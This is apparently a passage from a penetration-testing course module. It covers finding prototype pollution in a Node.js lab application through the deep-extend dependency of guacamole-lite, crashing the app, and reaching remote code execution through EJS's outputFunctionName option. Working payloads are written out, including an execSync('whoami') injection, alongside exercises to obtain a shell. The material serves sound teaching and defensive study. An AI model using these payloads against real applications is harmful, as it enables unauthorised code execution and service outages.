In these situations, when a vulnerable merge function is executed, the data is first parsed from a JSON object into a JavaScript object. More commonly, libraries will include middleware that will automatically parse an HTTP request body, with "application/json" content type, as JSON.1

Not all prototype pollution vulnerabilities come from the ability to inject "__proto__" into a JSON object. Some may split a string with a period character ("file.name"), loop over the properties, and set the value to the contents.2 In these situations, other payloads like "constructor.prototype" would work instead of "__proto__". These types of vulnerabilities are more difficult to discover using blackbox techniques.

To discover a prototype pollution vulnerability, we can replace one of the commonly used functions in the Object prototype in order to get the application to crash. For example, toString is a good target since many libraries use it and if a string is provided instead of a function, the application would crash.

We might need to continue using the application beyond the initial pollution to understand how the exploit impacts it. The initial request might start the prototype pollution, but it requires subsequent requests to realize the impact.

Many applications in production will run with the application started as a daemon and restart automatically if the application crashes.3 In these situations, the application might hang until the restart is complete, it might return a 500, or it might return a 200 with incomplete output. In these scenarios, we need to search for anything that is out of the ordinary.

Earlier, we discovered our target application accepts JSON on input in POST requests to the /token endpoint. Let's try to understand what happens if we try to replace the toString function with a string.

First, let's capture a POST request to /token in Burp and send it to Repeater.

Figure 12: Token Request in Repeater
Figure 12: Token Request in Repeater
Next, let's add a payload that will replace the toString function with a string in the object prototype (if it's vulnerable). We'll add this at end of the JSON after the connection object and send the request.

Figure 13: Adding Payload After Connection Object
Figure 13: Adding Payload After Connection Object
As we noticed earlier when we were exploring the application, the token in the response is encrypted and used for subsequent requests. To ensure that this payload propagates, let's use this token in the /rdp endpoint, as intended.

Navigating to the page in a browser loads the RDP endpoint as if nothing is wrong. If we reload the page, the application still works. It seems as if this request did not pollute the prototype.

Figure 14: Loading Page with No Crash
Figure 14: Loading Page with No Crash
This might seem disappointing, but we shouldn't give up just yet. If the application is running the payload through a vulnerable merge function, it is possible that only some objects are merged. Let's examine the original JSON in the payload.

{
	"connection": {
		"type": "rdp",
		"settings": {
			"hostname": "rdesktop",
			"username": "abc",
			"password": "abc",
			"port": "3389",
			"security": "any",
			"ignore-cert": "true",
			"client-name": "",
			"console": "false",
			"initial-program": ""
		}
	}
}
Listing 39 - Original JSON payload

The connection object has two keys: type and settings. An object like settings is popular for merging because the developer may have a set of defaults that they wish to use but extend those defaults with user-provided settings.

This time, let's attempt to set the payload in the settings object instead of the connection object and send the request.

Figure 15: Adding Payload to Settings Object
Figure 15: Adding Payload to Settings Object
Again, we will use the token in the response in the /rdp endpoint.

Figure 16: Application Crashes
Figure 16: Application Crashes
This time, the application responds, but the RDP connection does not load. In addition, refreshing the page shows that the application is no longer running.

As before, the only way to recover is to restart Node. In a true blackbox assessment, we would not have access to restart the application. However, to understand the vulnerability more, let's investigate the last lines of the docker-compose output before the application crashed.

We can obtain the logs of the application at any point by running docker-compose -f ~/chips/docker-compose.yml logs chips in an ssh session.

/usr/src/app/node_modules/moment/moment.js:28
            Object.prototype.toString.call(input) === '[object Array]'
                                      ^

TypeError: Object.prototype.toString.call is not a function
    at isArray (/usr/src/app/node_modules/moment/moment.js:28:39)
    at createLocalOrUTC (/usr/src/app/node_modules/moment/moment.js:3008:14)
    at createLocal (/usr/src/app/node_modules/moment/moment.js:3025:16)
    at hooks (/usr/src/app/node_modules/moment/moment.js:16:29)
    at ClientConnection.getLogPrefix (/usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:82:22)
    at ClientConnection.log (/usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:78:22)
    at /usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:44:18
    at Object.processConnectionSettings (/usr/src/app/node_modules/guacamole-lite/lib/Server.js:117:64)
    at new ClientConnection (/usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:37:26)
    at Server.newConnection (/usr/src/app/node_modules/guacamole-lite/lib/Server.js:149:59)
Listing 40 - Strack Trace of Crash

The moment library attempted to run toString. When it did, the application crashed with an "Object.prototype.toString.call is not a function" error.

Let's restart the application and use a whitebox approach to understand why this error occurred and where exactly the prototype pollution exists.

Exercise
Pollute the Object prototype by setting toString to a string and observe the application crash.

1
(Express, 2017), http://expressjs.com/en/4x/api.html#express.json ↩︎

2
(posix, 2020), https://blog.p6.is/Real-World-JS-1/ ↩︎

3
(PM2, 2021), https://pm2.keymetrics.io/ ↩︎

10.2.3. Whitebox Discovery
While a prototype pollution vulnerability may exist inside the main application, it is unlikely. Many libraries provide merge and extend functionality so that the developers do not have to create their own function. Nevertheless, it's important to check.

We can search for computed property names that accept a variable to reference a key in an object (as we discovered in the merge function). To do this, we would search for square brackets with a variable in between. However, the target application (not including the additional libraries) is so small that searching for a single square bracket is feasible. In other circumstances, this would usually have to be done with a manual code review.

Figure 17: Searching for Square Brackets
Figure 17: Searching for Square Brackets
The search revealed four files. webpack.config.js is used to generate the client-side code and public/js/index.js is the client-side code generated by Webpack. We can ignore these. The only other files are routes/index.js and routes/files.js but they uses the square bracket to access an array, which protects it from prototype pollution.

With the application source code ruled out for prototype pollution, let's start reviewing the libraries. To do this, we'll first run npm list to view the packages. However, when we reviewed the package.json file earlier, we noticed that it contained a list of devDependencies. We do not need to review these unless we are searching for client-side prototype pollution. To remove those from our list, we'll use -prod as an argument to npm list.

The deeper we get into the dependency tree, the less likely we are to find an exploitable vulnerability. The dependencies of dependencies are less likely to have code that we can actually reach. This is true with almost all JavaScript vulnerabilities inside third-party libraries. To compensate for this, we'll also provide the argument -depth 1 to ensure we are only obtaining the list of packages and their immediate dependencies.

student@oswe:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod -depth 1
Creating chips_chips_run ... done
app@0.0.0 /usr/src/app
...
+-- ejs@3.1.6
| `-- jake@10.8.2
+-- express@4.16.4
| +-- accepts@1.3.7
...
| +-- fresh@0.5.2
| +-- merge-descriptors@1.0.1
| +-- methods@1.1.2
...
| +-- type-is@1.6.18
| +-- utils-merge@1.0.1
| `-- vary@1.1.2
+-- guacamole-lite@0.6.3
| +-- deep-extend@0.4.2
| +-- moment@2.29.1
| `-- ws@1.1.5
....
Listing 41 - npm list Command

We will search this list for anything that might merge or extend objects. We can find three libraries with names that suggests they might do this: merge-descriptors, utils-merge, and deep-extend. Reviewing the GitHub repos and source code for merge-descriptors1 and utils-merge,2 we find that these basically implement the badMerge function we discussed earlier. That makes these libraries immune to prototype pollution.

However, deep-extend3 might be interesting as it's described as a library for "Recursive object extending."

In order to ensure we are reviewing the correct version of the deep-extend library, we will use the source code of the library found in node_modules. The main library code can be found in node_modules/deep-extend/lib/deep-extend.js.

...
82  var deepExtend = module.exports = function (/*obj_1, [obj_2], [obj_N]*/) {
...
91    	var target = arguments[0];
94      var args = Array.prototype.slice.call(arguments, 1);
95
96      var val, src, clone;
97
98      args.forEach(function (obj) {
99         // skip argument if isn't an object, is null, or is an array
100         if (typeof obj !== 'object' || obj === null || Array.isArray(obj)) {
101                 return;
102         }
103
104         Object.keys(obj).forEach(function (key) {
105           src = target[key]; // source value
106           val = obj[key]; // new value
...
109           if (val === target) {
110              return;
...
116           } else if (typeof val !== 'object' || val === null) {
117              target[key] = val;
118              return;
...
136           } else {
137              target[key] = deepExtend(src, val);
138              return;
139           }
140         });
141      });
142
143      return target;
144  }
Listing 42 - Deep Extend Source Code

Listing 42 shows a code block fairly similar to the vulnerable merge function we discussed earlier. The first argument to the deepExtend function will become the target object to extend (line 91) and the remaining arguments will be looped through (line 98). In our merge example, we accepted two objects. In deep-extend, the library will theoretically process an infinite number of objects. The keys of the subsequent objects will be looped through and, if the value of the key is not an object (line 116), the key of the target will be set to the value of the object to be merged. If the value is an object (line 136), deepExtend will recursively call itself, merging the objects. Nowhere in the source code would an object with the "__proto__" key be removed.

This is a perfect example of a library vulnerable to prototype pollution.

The vulnerability in this specific example is well-known.4 However, the latest version of guacamole-lite (at the time of this writing) has not updated the library to the latest version. Because of this, we could also use npm audit to discover the vulnerable library as well.

student@oswe:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm audit
Creating chips_chips_run ... done
                                                                                
                       === npm audit security report ===                        
                                                                                
                                                                                
                                 Manual Review                                  
             Some vulnerabilities require your attention to resolve             
                                                                                
          Visit https://go.npm.me/audit-guide for additional guidance           
                                                                                
                                                                                
  Low             Prototype Pollution                                           
                                                                                
  Package         deep-extend                                                   
                                                                                
  Patched in      >=0.5.1                                                       
                                                                                
  Dependency of   guacamole-lite                                                
                                                                                
  Path            guacamole-lite > deep-extend                                  
                                                                                
  More info       https://npmjs.com/advisories/612                              
                                                                                
found 1 low severity vulnerability in 1071 scanned packages
  1 vulnerability requires manual review. See the full report for details.
ERROR: 1
Listing 43 - NPM Audit Displaying Vulnerable Package

However, this won't always be the case, and knowing how to manually find packages like this is an important skill.

Many developers don't bother to fix issues like this because they are reported as "low" risk. As we'll find later, these are certainly not low-risk issues when paired with a proper exploit.

Now that we've discovered a library that is vulnerable to prototype pollution, let's find where it is used. The npm list command showed us that this was found in the guacamole-lite library.

First, let's review the directory structure of node_modules/guacamole-lite so we know which files to review.

├── index.js
├── lib
│   ├── ClientConnection.js
│   ├── Crypt.js
│   ├── GuacdClient.js
│   └── Server.js
├── LICENSE
├── package.json
└── README.md
Listing 44 - Directory Structure of Guacamole-lite

The LICENSE, package.json, and README.md files can be safely ignored. The index.js file only exports the Server.js file, which initializes the library. We'll start our review with Server.js.

001  const EventEmitter = require('events').EventEmitter;
002  const Ws = require('ws');
003  const DeepExtend = require('deep-extend');
004
005  const ClientConnection = require('./ClientConnection.js');
006
007  class Server extends EventEmitter {
008
009    constructor(wsOptions, guacdOptions, clientOptions, callbacks) {
...
034      DeepExtend(this.clientOptions, {
035        log: {
...
039        },
040
041        crypt: {
042          cypher: 'AES-256-CBC',
043        },
044
045        connectionDefaultSettings: {
046          rdp: {
047            'args': 'connect',
048            'port': '3389',
049            'width': 1024,
050            'height': 768,
051            'dpi': 96,
052          },
...
074        },
075
076        allowedUnencryptedConnectionSettings: {
...
103       }
104
105     }, clientOptions);
...
133   }
...
147   newConnection(webSocketConnection) {
148     this.connectionsCount++;
149     this.activeConnections.set(this.connectionsCount, new ClientConnection(this, this.connectionsCount, webSocketConnection));
150    }
151  }
152
153  module.exports = Server;
Listing 45 - Server.js

Within Server.js, we find that the DeepExtend library is indeed imported on line 3 and used on line 34. However, this is only used to initialize the guacamole-lite server. As the name implies, client connections are handled by ClientConnection.js, according to lines 5 and 149. This is initialized when a new connection is made.

While this file is vulnerable to prototype pollution, it is not exploitable using user-supplied data, as the arguments passed to DeepExtend here are passed when the server is initialized and no user-controlled input is accepted at that time.

This initialization is found in bin/www.

...
10  const GuacamoleLite = require('guacamole-lite');
11  const clientOptions = require("../settings/clientOptions.json")
12  const guacdOptions = require("../settings/guacdOptions.json");
...
27  const guacServer = new GuacamoleLite({server}, guacdOptions, clientOptions);
...
Listing 46 - bin/www File

The library is initialized with guacdOptions and clientOptions which are loaded from JSON files, not user input.

However, since the requests that might contain user input are handled by the node_modules/guacamole-lite/lib/ClientConnection.js, this file is worth reviewing.

001  const Url = require('url');
002  const DeepExtend = require('deep-extend');
003  const Moment = require('moment');
004 
005  const GuacdClient = require('./GuacdClient.js');
006  const Crypt = require('./Crypt.js');
007 
008  class ClientConnection {
009 
010    constructor(server, connectionId, webSocket) {
...
023
024      try {
025        this.connectionSettings = this.decryptToken();
...
029        this.connectionSettings['connection'] = this.mergeConnectionOptions();
030
031      } 
...
054    }
...
132    mergeConnectionOptions() {
...
140      let compiledSettings = {};
141
142      DeepExtend(
143        compiledSettings,
144        this.server.clientOptions.connectionDefaultSettings[this.connectionType],
145        this.connectionSettings.connection.settings,
146        unencryptedConnectionSettings
147      );
148
149      return compiledSettings;
150    }
...
159  }
...
Listing 47 - ClientConnection.js

We again find that the deep-extend library is imported into this file on line 2. This is a good sign for us. We also find that the constructor will first decrypt a token on line 25 and save it to the this.connectionSettings variable. The token parameter we found earlier was encrypted.

After the token is decrypted, the file will run mergeConnectionOptions, which calls deep-extend (lines 142-147) with the most notable arguments being the decrypted settings from the user input (line 145). More specifically, the settings object within the connection object is passed to the DeepExtend function. This is why the payload worked in the settings object during blackbox discovery, but not the connection object.

Now that we understand where and why the application is vulnerable, let's move on to doing something more useful than denial of service.

Exercise
Remotely debug the application and send the payload we sent earlier that crashed the application. Set a breakpoint on the mergeConnectionOptions function and step into the DeepExtend function. Don't step over the for loop. Instead, observe the variables that get passed and how they get merged. Also, observe the object prototype being overwritten.

Extra Miles
Find a value (other than toString) that will crash the application when it is set in the prototype.

So far, we have been able to obtain the token because this application allows the user to provide their own settings. This might not always be the case. We've introduced a directory traversal vulnerability into the application. Use this directory traversal to obtain the source for the encryption function and the encryption key. Generate a token, decrypt it, modify any parameter, and re-encrypt it. Use this modified token to connect to the RDP client.

1
(Ong & Wilson, 2019), https://github.com/component/merge-descriptors ↩︎

2
(Hanson, 2020), https://github.com/jaredhanson/utils-merge ↩︎

3
(Lotsmanov, 2018), https://www.npmjs.com/package/deep-extend ↩︎

4
(Roger, 2018), https://github.com/unclechu/node-deep-extend/issues/39 ↩︎

10.3. Prototype Pollution Exploitation
A useful prototype pollution exploit is application- and library-dependent.

For example, if the application has admin and non-admin users, it might be possible to set isAdmin to true in the Object prototype, convincing the application that all users are administrators. However, this also assumes that non-admin users never have the isAdmin parameter explicitly set to false. If isAdmin was set to false in the object directly, the prototype chain wouldn't be used for that variable.

As with most web applications, our ultimate goal is achieving remote code execution. With prototype pollution, we may be able to reach code execution if we find a point in the application where undefined variables are appended to a child_process.exec, eval or vm.runInNewContext function, or similar.

Consider the following example code:

function runCode (code, o) {
  let logCode = ""
  if (o.log){
    if (o.preface){
      logCode = "console.log('" + o.preface + "');"
    }
    logCode += "console.log('Running Eval');"
  }

  eval(logCode + code);
}

options = {"log": true}

runCode("console.log('Running some random code')", options)
Listing 48 - Code That Would Let us Reach RCE

Listing 48 shows us the types of code blocks we should search for that would let us reach code execution. In this example, the log key in the options object is explicitly set to true. However, the preface is not explicitly set. If we injected a payload into the preface key in the Object prototype before options is set, we would be able to execute arbitrary JavaScript code.

> {}.__proto__.preface = "');console.log('RUNNING ANY CODE WE WANT')//"
"');console.log('RUNNING ANY CODE WE WANT')//"

> options = {"log": true}
{ log: true }

> runCode("console.log('Running some random code')", options)

RUNNING ANY CODE WE WANT
undefined
Listing 49 - Using Prototype Pollution to Inject into runCode

As shown in Listing 49, we were successfully able to inject our own console.log statement and comment out the others.

Third-party libraries often contain these types of code blocks, and developers may implement them without realizing the risk.

Let's review the non-development dependencies again. This time, we will run npm list with -depth 0 since we're attempting to exploit the packages immediately available to us. If we don't find anything to exploit here, we could increase the depth. However, as we increase the depth, we also decrease the likelihood of finding a viable execution path.

student@oswe:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod -depth 0
Creating chips_chips_run ... done
app@0.0.0 /usr/src/app
+-- cookie-parser@1.4.5
+-- debug@2.6.9
+-- dockerode@3.2.1
+-- dotenv@8.2.0
+-- ejs@3.1.6
+-- express@4.16.4
+-- guacamole-lite@0.6.3
+-- hbs@4.1.1
+-- http-errors@1.6.3
+-- morgan@1.9.1
`-- pug@3.0.2
Listing 50 - NPM List with Depth of 0

The packages that are worth investigating include dockerode, ejs, hbs, and pug. At first glance, dockerode seems like the type of library that would run system commands to control Docker. However, in practice it uses requests sent to the socket. While this may still lead to command execution, we did not discover an attack vector for prototype pollution in this package.

The three templating engine packages, ejs, hbs, and pug, are a different story. JavaScript templating engines often compile a template into JavaScript code and evaluate the compiled template. A library like this is perfect for our purposes. If we can find a way to inject code during the compilation process or during the conversion to JavaScript code, we might be able to achieve command execution.

10.4. EJS
Let's start by reviewing EJS. We'll begin by attempting to use prototype pollution to crash the application. This will confirm that the server is running with EJS (which would be useful in a blackbox situation).

Once this proof of concept is complete, we'll attempt to obtain RCE.

10.4.1. EJS - Proof of Concept
Out of the three common templating engines for JavaScript, EJS is on the simpler side. The actual JavaScript code that runs EJS is 1120 lines while Handlebars has 5142 and Pug is at 5853 (not including non-Pug dependencies).

For this reason, we'll start with EJS to familiarize ourselves with the process, and then move on to more complicated libraries like Handlebars and Pug.

One of the components that make EJS simpler than Pug and Handlebars is that EJS lets developers write pure JavaScript to generate templates. Other templating engines, like Pug and Handlebars are essentially separate languages that must be parsed and compiled into JavaScript.

To discover how to exploit EJS using prototype pollution, we'll use the interactive Node CLI. This will allow us to load the EJS module, run functions, and debug them directly without having to reload the web page. This will obviously allow us to reload the CLI quicker when we break things with prototype pollution since we won't have to restart the web server. When we get a working payload using the CLI, we'll use that information to exploit the web application.

Let's begin by starting Node in the application container of the target server. We'll again use the docker-compose command with the exec directive to execute a command in the chips container. We'll run the node command to start the interactive CLI.

student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> 
Listing 51 - Running Node In the Docker Container

Now that we have our interactive CLI running, let's render an EJS template. According to the documentation,1 we can render a template by using the compile function or the render function:

let template = ejs.compile(str, options);
template(data);
// => Rendered HTML string

ejs.render(str, data, options);
// => Rendered HTML string
Listing 52 - EJS Documentation

Let's inspect the compile function in our IDE by opening node_modules/ejs/lib/ejs.js. The relevant code starts on line 379.

379  exports.compile = function compile(template, opts) {
380    var templ;
381  
382    // v1 compat
383    // 'scope' is 'context'
384    // FIXME: Remove this in a future version
385    if (opts && opts.scope) {
386      if (!scopeOptionWarned){
387        console.warn('`scope` option is deprecated and will be removed in EJS 3');
388        scopeOptionWarned = true;
389      }
390      if (!opts.context) {
391        opts.context = opts.scope;
392      }
393      delete opts.scope;
394    }
395    templ = new Template(template, opts);
396    return templ.compile();
397  };
Listing 53 - EJS Compile Function

The compile function accepts two arguments: a template string and an options object. After checking for deprecated options, a variable is created from the Template class and the compile function is executed within the Template object.

A quick review of the render function reveals that it is a wrapper for the compile function with a cache. Let's try executing both functions with a simple template.

student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.

> let ejs = require('ejs');
undefined

> let template = ejs.compile("Hello, <%= foo %>", {})
undefined

> template({"foo":"world"})
'Hello, world'

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, {})
'Hello, world'
Listing 54 - Rendering a Template with EJS

Next, we provide the compile and render functions a template, some data, and options. The response is a compiled Javascript function. When run, the function outputs "Hello, World".

Let's review the Template class in search of a prototype pollution exploit vector.

507  function Template(text, opts) {
508    opts = opts || {};
509    var options = {};
510    this.templateText = text;
511    /** @type {string | null} */
512    this.mode = null;
513    this.truncate = false;
514    this.currentLine = 1;
515    this.source = '';
516    options.client = opts.client || false;
517    options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
518    options.compileDebug = opts.compileDebug !== false;
519    options.debug = !!opts.debug;
520    options.filename = opts.filename;
521    options.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;
522    options.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;
523    options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER;
524    options.strict = opts.strict || false;
525    options.context = opts.context;
...
Listing 55 - Template Class

Reviewing the beginning of the Template class, we find that the options object is parsed from lines 516-525. However, many values are only set if the value exists. This is a perfect location to inject with a prototype pollution vulnerability.

The escapeFunction value is set to the opts.escape value. If we remember the modifications to the toString function, when an application or library expects a function but instead receives a string, the application crashes.

Let's set this option to a function, as the application expects, and review the output.

> o = {
...   "escape" : function (x) {
.....     console.log("Running escape");
.....     return x;
.....   }
... }
{ escape: [Function: escape] }

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, o)
Running escape
'Hello, world'
Listing 56 - Custom Escape Function

Our escape function accepts a parameter(x), logs a message, and returns the x parameter. When rendering a template with the escape function, the message is logged and the template is returned.

Next, let's replace the function with a string, and observe the error.

> o = {"escape": "bar"}
{ escape: 'bar' }

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, o)
Uncaught TypeError: esc is not a function
    at rethrow (/usr/src/app/node_modules/ejs/lib/ejs.js:342:18)
    at eval (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:662:12), <anonymous>:15:3)
    at anonymous (/usr/src/app/node_modules/ejs/lib/ejs.js:692:17)
    at Object.exports.render (/usr/src/app/node_modules/ejs/lib/ejs.js:423:37)
Listing 57 - Escape Function Set to String

As expected, the application throws an error. We can also verify that we can inject into this option with prototype pollution by polluting the Object prototype and passing in an empty object.

> {}.__proto__.escape = "haxhaxhax"
'haxhaxhax'

> ejs.render("Hello, <%= foo %>", {"foo":"world"}, {})
Uncaught TypeError: esc is not a function
    at rethrow (/usr/src/app/node_modules/ejs/lib/ejs.js:342:18)
    at eval (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:662:12), <anonymous>:15:3)
    at anonymous (/usr/src/app/node_modules/ejs/lib/ejs.js:692:17)
    at Object.exports.render (/usr/src/app/node_modules/ejs/lib/ejs.js:423:37)
Listing 58 - Setting Escape in the Object Prototype

This also returns an error. However, this is great for us because we can determine if the target application is running EJS. If a prototype pollution vulnerability sets escape to a string, and the application crashes, we know we are dealing with an application running EJS.

Let's attempt to crash our target application. In our payload, we'll set escape to a string, generate a token, and use that token to load a guacamole-lite session.

Figure 18: Generating a Token
Figure 18: Generating a Token
With the token generated, let's send the request to guacamole-lite and exploit the prototype pollution. This time, we'll send the request directly to the /guaclite endpoint instead of /rdp so we can keep this process in Burp.

Figure 19: Loading RDP
Figure 19: Loading RDP
The response indicates a switch to the WebSocket protocol, which means the token was processed. However, when a new page is loaded, the application crashes.

Figure 20: Application Crash
Figure 20: Application Crash
While it might seem that we are in the same position as we were earlier when we overwrote the toString function, we have discovered something that is very useful. In blackbox scenarios, the toString function is a great method to discover if the application is vulnerable to prototype pollution. However, this EJS proof of concept can be used to narrow down the templating engine that is being used in the application.

Next, let's attempt to obtain RCE using EJS.

Exercises
Follow along and provide the --inspect=0.0.0.0:9228 argument when starting the interactive node CLI if not already provided. Connect a remote debugger, set a breakpoint where the options are parsed, and step through the execution flow. Make sure that the application is running with EJS as the templating engine

Crash the application using the payload we created.

Fix the issue you just created after you verified it worked.

1
(EJS, 2021), https://ejs.co/#docs ↩︎

10.4.2. EJS - Remote Code Execution
At this point, we've learned that templating engines compile the template into a JavaScript function. The most natural progression to achieve RCE would be to inject custom JavaScript into the template function during compilation. When the template function executes, so would our injected code. Let's review how a template is rendered in EJS.

let template = ejs.compile(str, options);
template(data);
// => Rendered HTML string
Listing 59 - EJS Rendering

We'll again review the compile function in our IDE by opening node_modules/ejs/lib/ejs.js.

379  exports.compile = function compile(template, opts) {
380    var templ;
381  
382    // v1 compat
383    // 'scope' is 'context'
384    // FIXME: Remove this in a future version
385    if (opts && opts.scope) {
386      if (!scopeOptionWarned){
387        console.warn('`scope` option is deprecated and will be removed in EJS 3');
388        scopeOptionWarned = true;
389      }
390      if (!opts.context) {
391        opts.context = opts.scope;
392      }
393      delete opts.scope;
394    }
395    templ = new Template(template, opts);
396    return templ.compile();
397  };
Listing 60 - EJS Compile Function

The last step in this compile function is to run the Template.compile function. We will start reviewing from this last step to find if we can inject into the template near the end of the process. This will lower the risk of the prototype pollution interfering with normal operation of the application and our payload has less chance of getting modified in the process.

The Template.compile function is defined in the same source file starting on line 569.

569    compile: function () {
...
574      var opts = this.opts;
...
584      if (!this.source) {
585        this.generateSource();
586        prepended +=
587          '  var __output = "";\n' +
588          '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
589        if (opts.outputFunctionName) {
590          prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
591        }
...
609      }
Listing 61 - Template Class compile Function

The compile function in the Template class is relatively small and we quickly discover a vector for prototype pollution. On line 589, the code checks if the outputFunctionName variable within the opts object exists. If the variable does exist, the variable is added to the content.

A quick search through the code finds that this variable is only set by a developer using the EJS library. The documentation states that this variable is:

Set to a string (e.g., 'echo' or 'print') for a function to print output inside scriptlet tags.

In practice, it can be used as follows:

student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> ejs  = require("ejs")

> ejs.render("hello <% echo('world'); %>", {}, {outputFunctionName: 'echo'});
'hello world'
Listing 62 - outputFunctionname in EJS

The outputFunctionName is typically not set in templates. Because of this, we can most likely use it to inject with prototype pollution.

Let's examine the string that we would be injecting into on line 590 of node_modules/ejs/lib/ejs.js.

 'var ' + opts.outputFunctionName + ' = __append;'
Listing 63 - Location of Potential Injection

For this to work, our payload will need to complete the variable declaration on the left side, add the code we want to run in the middle, and complete the variable declaration on the right side. If our payload makes the function invalid, EJS will crash when the page is rendered.

 var x = 1; WHATEVER_JSCODE_WE_WANT ; y = __append;'
Listing 64 - RCE Injection POC

The highlighted portion in Listing 64 shows what our payload may be. Let's use the interactive CLI to attempt to log something to the console.

> ejs  = require("ejs")
...
> ejs.render("Hello, <%= foo %>", {"foo":"world"})
'Hello, world'

> {}.__proto__.outputFunctionName = "x = 1; console.log('haxhaxhax') ; y"
"x = 1; console.log('haxhaxhax') ; y"

> ejs.render("Hello, <%= foo %>", {"foo":"world"})
haxhaxhax
'Hello, world'
Listing 65 - Code Execution via CLI

Now that we've confirmed our approach works via the interactive CLI, let's attempt to exploit this in the target application.

Make sure that the TEMPLATING_ENGINE is set to 'ejs' when starting docker-compose. This will ensure we are using the ejs templating engine.

This time, we'll use a payload that will execute a system command and output the response to the console.

"__proto__":
{
    "outputFunctionName":   "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y"
}
Listing 66 - EJS Payload

We'll set the payload in the proper request location.

Figure 21: Code Execution via outputFunctionName - Request
Figure 21: Code Execution via outputFunctionName - Request
Once the token is returned, we'll use it to pollute the prototype.

Figure 22: Polluting the Prototype with RDP request
Figure 22: Polluting the Prototype with RDP request
Now, let's visit any page on the chips server and review the output of the log.

chips_1     | root
chips_1     | 
chips_1     | root
chips_1     | 
chips_1     | root
chips_1     | 
chips_1     | GET / 200 32.799 ms - 4962
Listing 67 - Docker Compose Log Output

Excellent! Our console.log payload was executed three times, proving that we can execute code against the server.

Exercises
Follow along with this section but connect to the remote debugger and observe the prototype pollution exploit.

Obtain a shell.

Extra Mile
Earlier, we used the escape variable to detect if the target is running EJS. We can also use this variable to obtain RCE with some additional payload modifications. Find how to obtain RCE by polluting the escape variable.

10.5. Handlebars
Now that we've learned how to detect if the target application is running EJS and how to obtain command execution, let's do the same using Handlebars.

10.5.1. Handlebars - Proof of Concept
To build a Handlebars proof of concept, we are going use techniques that were discovered by security researcher Beomjin Lee.1 Before we begin, we will restart the application to use the handlebars templating engine.

student@chips:~/chips$ docker-compose down
Stopping chips_chips_1 ... done
Stopping rdesktop      ... done
Stopping guacd         ... done
Removing chips_chips_1 ... done
Removing rdesktop      ... done
Removing guacd         ... done
Removing network chips_default

student@chips:~/chips$ TEMPLATING_ENGINE=hbs docker-compose -f ~/chips/docker-compose.yml up
...
Listing 68 - Restarting Chips

Unlike EJS, we do not need to crash an application to detect if it is running Handlebars. However, the size of the Handlebars library makes discovering paths that lead to exploitation labor-intensive.

While Handlebars is written on top of JavaScript, it redefines basic functionality into its own templating language. For example, to loop through each item in an array, a Handlebars template would use the each helper.

{{#each users}}
  <p>{{this}}</p>
{{/each}}
Listing 69 - Handlebars Each Helper

EJS, on the other hand, would have used JavaScript's forEach method.

<% users.forEach(function(user){ %>
  <p><%= user %></p>
<% }); %>
Listing 70 - EJS forEach

Since Handlebars redefines some standard functions, its parsing logic is more complicated than EJS.

The main functionality of the Handlebars library is loaded from the node_modules/handlebars/dist/cjs directory. Let's analyze the directory structure to understand where to start reviewing.

├── handlebars
│   ├── base.js
│   ├── compiler
│   │   ├── ast.js
│   │   ├── base.js
│   │   ├── code-gen.js
│   │   ├── compiler.js
│   │   ├── helpers.js
│   │   ├── javascript-compiler.js
│   │   ├── parser.js
│   │   ├── printer.js
│   │   ├── visitor.js
│   │   └── whitespace-control.js
│   ├── decorators
│   │   └── inline.js
│   ├── decorators.js
│   ├── exception.js
│   ├── helpers
...
│   │   └── with.js
│   ├── helpers.js
│   ├── internal
...
│   │   └── wrapHelper.js
│   ├── logger.js
│   ├── no-conflict.js
│   ├── runtime.js
│   ├── safe-string.js
│   └── utils.js
├── handlebars.js
├── handlebars.runtime.js
└── precompiler.js
Listing 71 - Handlebars CJS directory

For Handlebars templates to be turned into something usable, they must be compiled. The compilation process is very similar to that of typical compiled languages, such as C.

The original text is first processed by a tokenizer or a lexer. This will convert the input stream into a set of tokens that will be parsed into an intermediate code representation.2 This process will identify open and close brackets, statements, end of files, and many other parts of a language before it is executed.

Within Handlebars, the tokenization and parsing is handled by the compiler/parser.js file. The parse process is initiated by compiler/base.js.

...
13
14  var _parser = require('./parser');
15
16  var _parser2 = _interopRequireDefault(_parser);
...
33  function parseWithoutProcessing(input, options) {
34    // Just return if an already-compiled AST was passed in.
35    if (input.type === 'Program') {
36      return input;
37    }
38
39    _parser2['default'].yy = yy;
40
41    // Altering the shared object here, but this is ok as parser is a sync operation
42    yy.locInfo = function (locInfo) {
43      return new yy.SourceLocation(options && options.srcName, locInfo);
44    };
45
46    var ast = _parser2['default'].parse(input);
47
48    return ast;
49  }
50
51  function parse(input, options) {
52    var ast = parseWithoutProcessing(input, options);
53    var strip = new _whitespaceControl2['default'](options);
54
55    return strip.accept(ast);
56  }
Listing 72 - Handlebars base.js

